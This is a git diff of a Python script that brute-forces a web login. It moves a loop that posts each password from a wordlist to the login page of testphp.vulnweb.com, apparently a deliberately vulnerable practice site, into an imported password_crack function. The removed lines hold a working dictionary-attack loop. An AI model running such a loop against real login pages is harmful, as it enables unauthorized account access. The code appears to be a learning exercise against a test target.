@@ -4,12 +4,13 @@ from pathlib import Path
 from requests import post
 from sys import argv
 
+from password_crack import password_crack
+
 n = len(argv)
 wordlist = "book2.txt"
 print("total arguments passed: " + str(n))
 print("1st argument: " + argv[0])
 
-doRequest = False
 defUsername = 0
 defWordlist = 0
 
@@ -47,17 +48,5 @@ else:
     print("wordlist commandline argument not submitted / not found, Default wordlist: book2.txt")
     wordlist = "book2.txt"
 
-isLoggedIn = False
-url = "http://testphp.vulnweb.com/userinfo.php"
-with open(wordlist) as thefile:
-    for line in thefile:
-        password = line.rstrip()  # rstrip removes trailing newlines from an input (before this 'line' is "word\n")
-        payload = {"uname": username, "pass": password}
-        request = post(url, data=payload, allow_redirects=False)
-        if request.status_code == 200:
-            print(username + " logged in with " + password)
-            isLoggedIn = True
-            exit()
-    if not isLoggedIn:
-        print("Couldn't log in with username and/or wordlist")
+password_crack(wordlist, username)
 
